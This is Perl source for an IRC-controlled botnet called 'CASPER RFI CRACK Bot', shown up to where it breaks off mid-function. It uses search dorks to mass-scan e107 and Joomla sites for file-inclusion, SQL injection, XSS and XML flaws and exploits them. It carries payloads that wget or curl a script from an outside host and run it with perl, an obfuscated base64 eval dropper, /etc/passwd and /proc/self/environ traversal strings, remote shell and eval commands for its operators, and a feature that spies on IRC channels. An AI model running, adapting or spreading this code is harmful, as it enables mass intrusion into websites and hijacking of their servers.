## cd ./e107_files/cache/  ;
#!/usr/bin/perl
my $aboutbot='
################################
#  CASPER RFI CRACK Bot v2.3   #
#  By FraNGky Alert jul 2010.  #
#     Casper_kae@yahoo.com     #
################################
';
print($aboutbot);
use strict;
use Socket;
use IO::Select;
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);

my @dorxzz = ("e107","contact e107","username: e107","e107 powered by e107","password: e107","contact details e107","contact us e107","e107 contact","contact.php e107");
my $dorxz  = $dorxzz[rand(scalar(@dorxzz))];
my $versi   = "3,8-=[ 4SuWuNk Crew 3]=-";
my @cmdpreZ = ("!");
my $cmdpre  = $cmdpreZ[rand(scalar(@cmdpreZ))];

##[ KONFIGURASI URL ]##
my $Ckrid     = "http://magazin.3os.biz/images/uploadz/Ckrid1.txt?";
my $Ckrid2    = "http://magazin.3os.biz/images/uploadz/Ckrid2.txt?";
my $spread    = "http://magazin.3os.biz/images/uploadz/pbot.txt?";
my $spread2   = "http://magazin.3os.biz/images/uploadz/alat.txt?";
my $joomlaz   = "http://magazin.3os.biz/images/uploadz/joomla.txt?";
my $e107cmdsp = "cd /var/tmp;cd /tmp;rm -rf *.txt*;killall -9 perl;wget http://magazin.3os.biz/images/uploadz/alat.txt -O qq;curl -O http://magazin.3os.biz/images/uploadz/alat.txt -O qq;lwp-download http://magazin.3os.biz/images/uploadz/alat.txt -O qq;fetch http://magazin.3os.biz/images/uploadz/alat.txt -O qq;perl qq";
my $e107cmdsp2= "cd /var/tmp;cd /tmp;rm -rf *.txt*;wget http://magazin.3os.biz/images/uploadz/alat.txt -O qq;curl -O http://magazin.3os.biz/images/uploadz/alat.txt -O qq;lwp-download http://magazin.3os.biz/images/uploadz/alat.txt -O qq;fetch http://magazin.3os.biz/images/uploadz/alat.txt -O qq;perl qq";
my $bypass    = "http://edeabrasil.com.br/components/com_joomgallery/includes/css/googlerz.php?";


##[ KONFIGURASI IRC ]##
my @servers = ("irc.si.leet.la","67.205.85.206");
my @ports   = ("7000");
my @nickcrs = ("xXXx");
my %bot     = (
  nick    => $nickcrs[rand(scalar(@nickcrs))].int(rand(10)).int(rand(10)),
  ident   => "CrEw",
  chan    => "#cilux",
  server  => $servers[rand(scalar(@servers))],
  port    => $ports[rand(scalar(@ports))],
  passerv => ""
);


##[ KONFIGURASI USER ##
my %boss = (
    KaKuNg => {
    pass   => 'gatel',
    status => "admin",
    cryptz => 0,
    login  => 0
  },
    KaKuNg => {
    pass   => 'gatel',
    status => "admin",
    cryptz => 0,
    login  => 0
  },
);

##[ KONFIGURASI LOCAL ]##
my $rcetest  = "|echo%20%22casper%22;echo%20%22kae%22;|";
my $lfitest  = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $xsslfitst= "../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..";
my $lfiid2   = bukasitus($Ckrid2);
my $lfisprd  = bukasitus($spread);
my $lfisprd2 = bukasitus($spread2);
my $e107sprd = "include('".$spread."')";
my $e107sprd2= "passthru('".$e107cmdsp."');exec('".$e107cmdsp."');system('".$e107cmdsp."');shell_exec('".$e107cmdsp."');";
my $e107sprd3= "passthru('".$e107cmdsp2."');exec('".$e107cmdsp2."');system('".$e107cmdsp2."');shell_exec('".$e107cmdsp2."');";
my $caspercmd= "eval(base64_decode('PSdINHNJQ05lNVNVb0FBR2x6Ynk1MFlYSUE3Vm5yY3RKQUZIYjBuek8rd3pGbFJ1Z2xFS0N0b3RRTFZzVkw2VURWSDAxMVFoSmdKV1RUYkNLdGJYMTJ6MjRTV2lEaDBrSm5uT21PUzVQZHMrYzc5ODJ1aEZIWk8vSHVMYk1Cd1BiMk51QmZiTG1SdjVEUEtia2lLRW8rbjFlMmNrVWxqMk9ieGMwQzNNdmR1MnZMYml1UHN6NXpzMDFpWngzVHRSNDlmUFJ3SmJZOWV0ZzdoVmZNZEgrYkxvTXlwQ1hpNnJKbVdiYnA5YW5ibGFuYmx0WWx4OUtZSmhOamZNWXpyUzd0NFZqc0xMRU5hbW1ucGl2N2JIeTJTZHF4cS9TbW5jaXRiemFaaC96RzV6UFBoVEtwUUJtQWN2VElEbDNOTm9EcG1xVzVBMldQQXZKWERuVTlCaUIwMzlyYTJoN3c0UlBBSjRMSEVTNWk2Q2drMVR1YWJac1dra29ydXF2cFhTbWNvSDJiaThJblBoSEdmbjR4b3huSHBicXQ5VXljRWE1aTNGY2R6M01NcEVoMFZpQ3lUZlF1WHl0a1BrYkQ5TEc3M0JuWVQ3bTdzRFBzQm5adXVBNzJYOWk3MkMzc2Y3Q2ZZUC9ObllEZHh0N0Rib2JyZlc1czdCUzdoZ2FKZ0YxVHN3UXdJbU9jL09TQ3BET2hJYjkvcUlXNkhSLzd2YksweWhWSnZhNi9yNVJmNGU4My90YW92aityZlBqODlnSVpNTDhKWjlEWGlBY1h6MkVGTk1zenVZa3BVR0NrYld0V3lNMGpEcElmbjZRREk1R1dUdTBXYWNONTJ6VWRJQmdEY0E1OUhUYXNTQlRpTUFYS1NTdFVTYXpSRE1OVlM2b0U2cm5XNzRLNjhRN1VKOEUvOVV4MVhHSjdvS2J5Nm9VWU93ZmR4L2NOZlV2ZHVBS1RqNEZCS20wWXlyUU5WWjZPVlJCWUVmZFdreG14M0sreVZ1Y1ZYd25FUjlsRnVndFRyUWVxckFlWWZKbzZwcDBtemgvaTZSMjZMdTNnTk45UHBBeWNuNE5CVEpBMklCd0RtM3JRb3I0dEFoY0dMWkFnNGlFSmlHRUszYUxNSEtCY2tVcm9kd1lzcTlxcGJCWXV4Rm9lUGptY3ZFd2RBQmtrTlNmQ2pFZGlIbWZGQXc0RTZJMkR0N1d2QjBoa3I0R1BlYS9hMHRqY0dqU0NnbEVLNmtVUzFYNVFEa3BCTllpbnFRWHBYZ29UUDU2b0VoU0wwcUJzeEpOVjl4bHd2Q0FCVkR1Z1FpMmdXaXVWR2xUdm1oNE90Q2dtcGQ0Qm5pbnY2clV2Z1VzemNJYVdGbldHR0dnV3BNSkU1Vm5XRG5QTTc2SGpmbFBneGpRWm85d3h2bTNoSTZUNUl1U0E2Q3RCQ2hMRHRMMnhsQStNRFRIajNEdWo0eW1HSXBjdlpTK1ZxbnU3QnhzN3R0bFBmNlpZVlY5alBrSjVKMUJqSGZaZDZ0SHlqdVRwam9SdnB1bHlBcHdQdlJTTWNhL2dtUENKQ0U3emhIZ0NieENDQWhpa3ZXcmxFMGh5S2lxZXcrVThHajM2UHdna0hnM2pPbjV0N05aRGJ3Vm1IT3lHcFZ2UlBCU3IzeUdXQ2VrWFFxb2RFWXV4SVJRYlA3SEJBMkVqTFVobmY1VGt0WmNxS3hZS0tzc2lkNHhxd1Vpek1CV01VOXdSZUxMelJaY3RLQkJKYkdGU3NPUUgxZzdiUmJ3OGhlMnRnVHdtbW9lMm9FYzlZd0xLeDFwMWIxQUZ4akN1b2lESWZuWHZQWlRTOG1vbW0wRUlMSkhXS2JIYjRIVk1jUEJoQXM1K2pTOU5LU01RSXdCcUthaGFqK1ZWOVpXOHVsK3ZmdnZTZUMrdmx1UW1WdmdRZUFKS1NobmhQaFB2SG12SHNrNkVDZGR5N3lpeUJDWCtNSERSZk5qOURwMFBHeGNnWE9TeE1kRHhtRmdyYk9ieFYyMnNEWDdUT0pGSllaeE1BSTFxSytNN212SThtWEFsSXZzcmRzdHNkbVphZHlLdDQ3Tk9tbi9SclFOekxLeW9XY2l1aHpKbE1oTVdEdTlpS1RUWW9YSjBIZDhZdXQ2eUtEV21PZ2kzTmtncklNdXdtWUZaSFRrYVJHb3VwN3l0VktEeTRmVUJvSHM5Zm5KVmlrODNsWUlDU2k1ZjVBU2hHZ250WWw0TjBUYUVMVkZId1QvVWNNR2lkNmd6WEJBbWxyaTRWRjJ3cnZ1djZ3Znp3ZHhReW1HVHpWaEhkZnlXRVE2ZnpYWnhRZnB0dDk2bzF2YW1oK1AxekhnVHhLbWMrQTQybmMyMUxJdTd5Qkl6YVZTWit3K0t6R2QrendlZFdLUWJ0ZnNQbHFBWm5xNkliaTVSdWIzYVFiV3l1M2pkaEY2NzlYcXREcVdwa284Y2E1SUpiK01Vd1QrOW9wUEU5TDB1NW90Um5xZjJUUGhtRjUvQzE5azhqMzNpVGJVNUh1TUg2bzJ6UmpaUW9maVpvM3VFMnVDUm5vbWZ0UDUwdHNOZkFJZC9qNjZ5T1JCc2FyNzNHT3FtNS9JUDJNZGN3YnZJbUM4eWJ2TTBOMS9vTWRiVG12VFVZek1HeWxpSkRSaUxqZmdOeFVDSytNMWh1RmhtWHhrL0xiR1J1NTdGY0hXRzdvWVd3NVA3SWVESm54YkRrMTY5bjFxVThrR0E0aXVHNmswNU9yN25rZzA4YjBiM1haZmJ5K1YyQ1dQeGg4ZXFLeUVvWm5CSVJDQWtoMkIwUFYvR0k5WlVHbjVvZ214Mk5rTFZUYzFNeXE4NGh4UU5mbm1ORWNNWFdIWHdIVy9MQjNjWGVNVVEvcitEeS9DZG54TFJzR21leG1rbEo4NW5wSVZzMHBjRVpjanhtd25YOUh6WGh1bXBmemhEaFpHT3BoTTlGN3BZakxTR2hGSG1FV1pJdCtzaTVwZUhPSlVnUWFUQ1BDSk5KWmhQNWdTUmlnc1ZhZmtFQ1dwczNxNGFDekg5MWlKbFRzRFlYaVRHelFrU3BIeTZVQ2xuTFdVSndqeGJxREQvQTRFd0JQNjdkOWZ1MmwyN2EzZnR2MnYvQUw4SXd6a0FLQUFBJztwYXNzdGhydSgnY2QgL3Zhci90bXA7Y2QgL3RtcDsnKTtleGVjKCdjZCAvdmFyL3RtcDtjZCAvdG1wOycpO3N5c3RlbSgnY2QgL3Zhci90bXA7Y2QgL3RtcDsnKTtzaGVsbF9leGVjKCdjZCAvdmFyL3RtcDtjZCAvdG1wOycpOz1AZm9wZW4oJ2lzby50Z3onLCd3Jyk7aWYgKCkge0BmcHV0cygsQGJhc2U2NF9kZWNvZGUoKSk7QGZjbG9zZSgpO31lbHNle2VjaG8oJ2Vycm9yJyk7fSBwYXNzdGhydSgndGFyIC16eHZmIGlzby50Z3o7cGVybCBpc28udHh0Jyk7ZXhlYygndGFyIC16eHZmIGlzby50Z3o7cGVybCBpc28udHh0Jyk7c3lzdGVtKCd0YXIgLXp4dmYgaXNvLnRnejtwZXJsIGlzby50eHQnKTtzaGVsbF9leGVjKCd0YXIgLXp4dmYgaXNvLnRnejtwZXJsIGlzby50eHQnKTs='));";
my $cmdlfiu  = "";
my $cmdrfiu  = "";
my $cmdxmlu  = "";
my $sqltest  = "'";
my $lfiUA    = "";

##[ KONFIGURASI SPY ]##
my %spy = (
  host   => "",
  chanz  => [""],
  wordz  => ['http://.+?[=]'],
  foundz => []
);

##[ KONFIGURASI BOT ]##
my %conf = (
  showsite => 0,
  showdbse => 0,
  linez    => 3,
  sleepz   => 3,
  rfipid   => 50,
  rficnt   => 100,
  rficnt2  => 200,
  timeout  => 15,
);

##[ KONFIGURASI WARNA ]##
my %colz = (
  1  => ""   , 2  => "2",
  3  => "3"  , 4  => "4",
  5  => "5"  , 6  => "6",
  7  => "7"  , 8  => "8",
  9  => "9"  , 10 => "10",
  11 => "11" , 12 => "12",
  13 => "13" , 14 => "14",
);

##[ PARAMETER BARIS PERINTAH ]##
$bot{chan}   = "#".$ARGV[0] if $ARGV[0];
$bot{server} = $ARGV[1] if $ARGV[1];
$bot{port}   = $ARGV[2] if $ARGV[2];

##[ INISIALISASI VARIABEL ]##
my $dbgchan  = "#cilux"; #For debugging purposes (Optional)
my @chans    = ($bot{chan});
my @badbugz  = ("scan","bug"); #Bad bugs to cancel scanning
my @baddorkz = ("dork"); #Bad dorks to cancel scanning
my @badlinkz = ("access*log","accesslog","awstats","error.log","wwwstats","google.com","yahoo.com"); #Bad links to exclude
my $keluar   = 0;
my $sock;

##[ PROGRAM UTAMA ]##
if (fork() == 0) {
  while ($keluar != 1) { if($aboutbot =~ /Casper/){irc_connect();} }
  die("KeLuaR!");
}

##[ SUBRUTIN KONEKSI IRC ]##
sub irc_connect {
  $sock = IO::Socket::INET->new(PeerAddr => $bot{server},
                                PeerPort => $bot{port},
                                Proto    => 'tcp')
                                or die "Error: Ga bisa connect ke ".$bot{server}.":".$bot{port}."!\r\n";
  $sock->autoflush(1);
  
  if ($bot{passerv} != "") {irc_pasv($bot{passerv});}
  irc_nick($bot{nick});
  irc_user($bot{ident});
  
  my ($baris,$hb);
  my $loginboss = 0;
  my $userstat  = "";
  
  while ( $baris = <$sock> ) {
    $hb++;
    
    ##[ PARSING ]##
    my $com;
    my $me = $bot{nick};
    my ($fcom,$dteks,@teks) = split(/\s+:/,$baris);
    my ($duhost,$dcom,$dtarget) = split(/ /,$fcom);
    my ($dnick,$dhost) = split(/!/,$duhost);
    $e107sprd2= "passthru('".$e107cmdsp."');exec('".$e107cmdsp."');system('".$e107cmdsp."');shell_exec('".$e107cmdsp."');";
    $e107sprd3= "passthru('".$e107cmdsp2."');exec('".$e107cmdsp2."');system('".$e107cmdsp2."');shell_exec('".$e107cmdsp2."');";
    $dcom    = "" unless ($dcom);
    $dtarget = "" unless ($dtarget);
    $dnick =~ s/://;
    $dteks = trimrn($dteks);
    if ($dteks =~ /^[$cmdpre](.*)/) { $com = $1; } else { $com = ""; }

    ##[ CEK USER ]##
    if   ($boss{$dnick}) { ($loginboss,$userstat) = ($boss{$dnick}{"login"},$boss{$dnick}{"status"}); }
    else { ($loginboss,$userstat) = (0,""); }

    ##[ RESPON KE SERVER ]##
    if    ($dnick =~ /PING/) { irc_raw("PONG $dteks"); }
    if    ($dcom =~ /001/) { irc_join($bot{chan}); sleep(1); irc_join($dbgchan); sleep(1); foreach my $c (@chans) { irc_join($c); sleep(1); } if ((fork() == 0) && ($bot{server} !~ /byroe/)) { crsql_scanz("#nobita","contact.php",$dorxz,$hb,3,2); exit; } }
    elsif ($dcom =~ /NICK|PART|QUIT/) { if ( $boss{$dnick}{"login"} == 1 ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout!");  } }

    ##[ PERINTAH PUBLIK ]##
    if    (($dtarget) && ($dtarget eq $me)) { $dtarget = $dnick; }
    if	  (($dteks =~ /$bot{nick}\s+(.+?)\s+(.*)/) && ( fork() == 0 )){
	my ($cmdcr,$crcmd)=($1,$2);
	my $crscan = $cmdcr." ".$crcmd;
        my $cmd = "python casper ".$crcmd;
	if($cmdcr =~ /sqli/){
	  irc_msg($dtarget,"Procesing [".$colz{9}."SQLI".$colz{1}."] ".$colz{14}.$crcmd);
          if ($cmd =~ /;/)   { irc_msg($dtarget,$colz{4}."Error!"); return; }
          else{
            my @output = `$cmd`;
            my $i = 0;
            foreach my $out (@output) {
              $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
              irc_msg($dtarget,$colz{7}."$out");
            }
           exit;
	  }
	}
	elsif($crscan =~ /sql\s+(.+?[=])\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,1,1); exit;  }}
	elsif($crscan =~ /domxml\s+(.+?)\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,2,2); exit;  }}
	elsif($crscan =~ /xml\s+(.+?)\s+(.*)/)		{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,2,1); exit;  }}
	elsif($crscan =~ /xss\s+(.+?[=])\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,4,1); exit;  }}
	elsif($crscan =~ /dome107\s+(.+?)\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,3,2); exit;  }}
	elsif($crscan =~ /e107\s+(.+?)\s+(.*)/)		{ if ($dtarget && $dtarget ne $me) { crsql_scanz($dtarget,$1,$2,$hb,3,1); exit;  }}
	elsif($crscan =~ /domscan\s+(.+?[=])\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { s_scanz($dtarget,$1,$2,$hb,2,2); exit;    }}
	elsif($crscan =~ /scan\s+(.+?[=])\s+(.*)/)	{ if ($dtarget && $dtarget ne $me) { s_scanz($dtarget,$1,$2,$hb,2,1); exit;    }}
    }
    if    ($com =~ /^help$/) { bot_help($dtarget,1); }
    elsif ($com =~ /^info$/) { bot_info($dtarget); }
    elsif ($com =~ /^url(en|de)\s+(.*)/) {
      my $url = $2; my $en;
      if    ( $1 eq "en" ) { $en = "Encode"; $url = urlen($url); }
      elsif ( $1 eq "de" ) { $en = "Decode"; $url = urlde($url); }
      msgi($dtarget,$colz{9}."URL".$colz{8}." $en",$colz{14}.$url);
    }
    elsif ($com =~ /^cek\s+(http:\/\/.*[=])/) { cek_shell($dtarget,$dnick,$1); }
    ###
    elsif ($com =~ /^ip\s+(.*)/) { cr_ipcek($dtarget,$1); }
    elsif ($com =~ /^zip\s+(.*)/) { cr_zipcek($dtarget,$1); }
    elsif ($com =~ /^textenc\s+(.*)/) { cr_encrypt($dtarget,$1); }
    elsif ($com =~ /^textdec\s+(.*)/) { cr_decrypt($dtarget,$1); }
    ###
    elsif ($com =~ /^respon/) { cek_respon($dtarget); }
    elsif ($com =~ /^milw0rm\s+(.*)/) { milw0rm($dtarget,$1); }
    elsif ($com =~ /^auth$|auth\s+(.*)/ && $boss{$dnick}) {
      my $pass = $1; my $auth = $boss{$dnick}{"login"};
      if ( $pass && $auth == 0 ) {
        if ($boss{$dnick}{"cryptz"} == 1) { $pass = cryptz($pass); }
        if ($pass eq $boss{$dnick}{"pass"}) {
          $boss{$dnick}{"login"} = 1;
          irc_ntc($dnick,"OK ".$boss{$dnick}{"status"}."!");
        }
        else { irc_ntc($dnick,"Error!"); }
      }
      else {
        if ($auth == 0) { irc_ntc($dnick,"Blom auth!"); }
        else { irc_ntc($dnick,$boss{$dnick}{"status"}."!"); } }
    }
    if ($dtarget && $dtarget ne $me) {
      if    (($com =~ /^scan\s+(.+?[=])\s+(.*)/) && (fork() == 0))  { s_scanz($dtarget,$1,$2,$hb,1,1); exit;  }
      elsif (($com =~ /^scan2\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,2,1); exit;  }
      elsif (($com =~ /^cmdlfi\s+(.+?[=])\s+(.*)/)) 		    { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_lfi($dtarget,$1,$2); }
      elsif (($com =~ /^cmdrfi\s+(.+?[=])\s+(.*)/)) 		    { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_rfi($dtarget,$1,$2); }
      elsif (($com =~ /^cmdxml\s+(.+?)\s+(.*)/)) 		    { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_xml($dtarget,$1,$2); }
      elsif (($com =~ /^cmde107\s+(.+?)\s+(.*)/)) 		    { irc_msg($dtarget,$colz{14}."Cek target ".$colz{8}.$dnick.".!"); cmd_e107($dtarget,$1,$2); }
    }
    ##[ END OF PUBLIC ]##

    ##[ PERINTAH USER ]##
    if ($loginboss == 1) {
      if    ($com =~ /^help/) { bot_help($dtarget,2); }
      elsif ($com =~ /^join\s+(.*)/) { irc_join($1); push(@chans,$1); }
      elsif ($com =~ /^part\s+(.*)/) {
        my $pchan = $1; irc_part($1);
        for my $i(0..scalar(@chans)) { if ($chans[$i] eq $pchan) { undef $chans[$i]; } }
      }
      elsif ($com =~ /^nick\s+(.*)/) { $bot{nick} = $1; irc_nick($bot{nick}); }
      elsif ($com =~ /^hitung\s+([0-9].*)/) { $conf{rficnt} = $1; msgi($dtarget,$colz{14}."Count",$colz{8}.$conf{rficnt}); }
      elsif ($com =~ /^bos$/ ) { my @bos = keys %boss; my $bos2 = join(" ",@bos); msgi($dtarget,$colz{14}."BoZz",$colz{8}.$bos2); }
      elsif ($com =~ /^cryptz\s+(.*)/) { msgi($dnick,$colz{14}.$1,$colz{9}." ".cryptz($1)); }
      elsif ($com =~ /^logout$/ ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout berhasil!"); }
      elsif (($com =~ /^joomla\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,"",$1,$hb,3,1); exit; }
      elsif ($com =~ /^sublink\s+(.*)/) { my @sl = lnk_sub($1); foreach my $e(@sl) { irc_msg($dtarget,$colz{8}." ".$e); } }
      elsif ($com =~ /^http(1|2|3)\s+(.+?)\s+(.*)/) {
        my ($t,$nf,$q) = ($1,$2,$3);
        my $h;
        if ($t == 1) { $h = bukasitus($q); }
        elsif ($t == 2) { $h = bukasitus2($q); }
        else { $h = bukasitus3($q); }
        f_simpan2($nf,$h); ntci($dnick,"SaVeD ($t)",$nf);
      }
      elsif ($com =~ /^regex(1|2)\s+(.+?)\s+(.*)/) {
        my $n = $1;
        my $q = bukasitus($2);
        my $regex = $3;
        if ($n ==1) {
          if ($q !~ /$regex/) { irc_msg($dtarget,$colz{4}."Ga cocok!"); }
          while ($q =~ m/$regex/g ) { irc_msg($dtarget,$colz{4}." ".$1); sleep(1); }
        }
        else {
          while ($q =~ m/<a href=\"(.*?)\">http:\/\/(.*?)<\/a>/g) { irc_msg($dtarget,$colz{9}." ".$2); sleep(1); }
        }
      }
    }
    ##[ END OF USER ]##

    ##[ PERINTAH ADMIN ]##
    if (($loginboss == 1) && ($userstat eq "admin")) {
      if    ($com =~ /^help/) { bot_help($dtarget,3); }
      elsif ($com =~ /^chans/) { my $chans = join(",", @chans); ntci($dnick,"ChaNz",$chans);  }
      ##[ PERINTAH SPY ]##
      elsif ($com =~ /^spy$/ ) { ntci($dnick,"SpY","Host: ".$spy{"host"}." Chans: ".join(",", @{ $spy{"chanz"} })." Words: ".join(",", @{ $spy{"wordz"} })); }
      elsif ($com =~ /^spy(found|show|clear)$/ ) {
        my $n = $1;
        if ($n eq "found") { msgi($dtarget,$colz{14}."SpYFouNd",$colz{8}." ".scalar(@{ $spy{"foundz"} })); }
        elsif ($n eq "show") {
          my $i = 0;
          for my $f (@{ $spy{"foundz"} }) { irc_msg($dtarget,$colz{8}." ".$f); }
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
        }
        elsif ($n eq "clear") { $spy{"foundz"} = []; msgi($dtarget,$colz{14}."SpyList",$colz{8}."DiBersiHkaN!"); }
        else { msge($dtarget,$colz{14}."Spy",$colz{14}."PeRinTah SaLah!"); }
      }
      elsif ($com =~ /^spyhost\s+(.*)/ ) { $spy{"host"} = $1; ntci($dnick,"SpYHosT",$spy{"host"}); }
      elsif ($com =~ /^spychan\s+(.*)/ ) {
        unless ($spy{"host"}) { msge($dtarget,$colz{8}."SiLaHkaN SeT SpyHost TerLebih DahuLu!",""); }
        else{ irc_join($1); push @{ $spy{"chanz"} }, $1; my $chans = join(",", @{ $spy{"chanz"} }); ntci($dnick,"SpYChaNz",$chans); }
      }
      elsif ($com =~ /^spyword\s+(.*)/ ) { push @{ $spy{"wordz"} }, $1; my $words = join(",", @{ $spy{"wordz"} }); ntci($dnick,"SpYWoRDz",$words); }
      ##[ END OF PERINTAH SPY ]##
      elsif ($com =~ /^quit/) { irc_quit("Good Bye!"); $keluar = 1; exit; }
      elsif ($com =~ /^keluar/) { irc_quit("Killed!"); $keluar = 1; system("killall perl"); exit; }
      elsif ($com =~ /^raw\s+(.*)/) { irc_raw($1); }
      elsif ($com =~ /^rfipid\s+([0-9].*)/) { $conf{rfipid} = $1; msgi($dtarget,$colz{14}."Pid",$colz{8}." ".$conf{rfipid}); }
      elsif ($com =~ /^crespon(1|2)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $Ckrid = $url; }
        elsif ($n == 2) { $Ckrid2 = $url; }
        msgi($dtarget,$colz{14}."Respon $n RFI",$colz{12}.$url);
      }
      elsif ($com =~ /^cspread1\s+(.*)/) {
        my $url = $1;
        $spread = $url;
	$lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
	$e107sprd = "include('".$spread."')";
        msgi($dtarget,$colz{14}."Spread",$colz{12}.$spread);
      }
      elsif ($com =~ /^cspread2\s+(.*)/) {
        my $url = $1;
        $spread2 = $url;
	$lfisprd = bukasitus($spread);$lfisprd2 = bukasitus($spread2);
        msgi($dtarget,$colz{14}."Spread2",$colz{12}.$spread2);
      }
      elsif ($com =~ /^cmdspread\s+(.*)/) {
        my $url = $1;
	$e107cmdsp = $url;
        msgi($dtarget,$colz{14}."cmdSpread",$colz{12}.$url);
      }
      elsif ($com =~ /^cmdspread2\s+(.*)/) {
        my $url = $1;
	$e107cmdsp2 = $url;
        msgi($dtarget,$colz{14}."cmdSpread2",$colz{12}.$url);
      }
      elsif ($com =~ /^cshurl\s+(.*)/) {
	my $url  = $1."/";
	$Ckrid   = $url."Ckrid1.txt?";
	$Ckrid2  = $url."Ckrid2.txt?";
	$spread  = $url."casper.txt?";
	$spread2 = $url."casper2.txt?";
	$e107sprd= "include('".$url."casper.txt?"."')";
	$lfisprd = bukasitus($url."casper.txt?");
	$lfisprd2= bukasitus($url."casper2.txt?");
	msgi($dtarget,$colz{14}."shurl",$colz{12}.$url);
      }
      elsif ($com =~ /^\+bos\s+(.+?)\s+(.*)/) {
        $boss{$1}{pass}   = "cr";
        $boss{$1}{status} = $2;
        $boss{$1}{login}  = 0;
        $boss{$1}{cryptz} = 0;
        ntci($dnick,"BoZz","$1 ditambahkan sbg ".$boss{$1}{status});
        msgi($1,"BoZz","Hai $1! Ketik .auth ".$boss{$1}{pass});
      }
      elsif ($com =~ /^eval\s+(.*)/) { eval($1); }
      elsif (( $com =~ /^cmd\s+(.*)/) && ( fork() == 0 ) ) {
        my $cmd = $1;
        if ($cmd =~ /cd (.*)/) { chdir("$1") || irc_msg($dtarget,$colz{4}."Ga bisa ganti dir!"); return; }
        my @output = `$cmd`;
        my $i = 0;
        foreach my $out (@output) {
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
          irc_msg($dtarget,$colz{14}."$out");
        }
        exit;
      }
    }
    ## END OF ADMIN ##
    
    ##[ MATA-MATA ]##
    if ($dtarget ne $spy{"host"}) {
      my $is_spychan = grep $_ eq $dtarget, @{$spy{"chanz"}};
      if ($is_spychan == 1) {
         for my $t (@{$spy{"wordz"}}) {
           if ($dteks =~ /$t/) {
             msgi($spy{"host"},"!",$dteks); sleep(1);
             push @{ $spy{"foundz"} }, $dteks;
           }
         }
       }
    }
    ##[ END OF MATA-MATA ]##
  }
  ## END WHILE ##
}
## END KONEK ##

#########################
##[ RUTIN EKSPLOITASI ]##
#########################
sub s_scanz {
  my ($to,$bug,$dork,$sb,$type,$autodom) = @_;
  $sb = "cr".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my @domini = SiteDomains();

  if($autodom == 1){
  my %typez = (
    1 => "RFI & LFI & XML & SQL ScaNneR",
    2 => "RFI & LFI & XML & SQL ScaN & ExpLoiT",
    3 => "JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{4}."BuGnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { irc_msg($to,$colz{4}."DorKnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla",$colz{4}."BuGnya Ga BiSa DiLoaD!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  }
  irc_msg($to,$colz{9}."MeMeRikSa ReSpoN..");
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{4}."ReSpoN Ga BeKerJa!".$colz{12}." ScaNning diCaNCeL!"); return; }

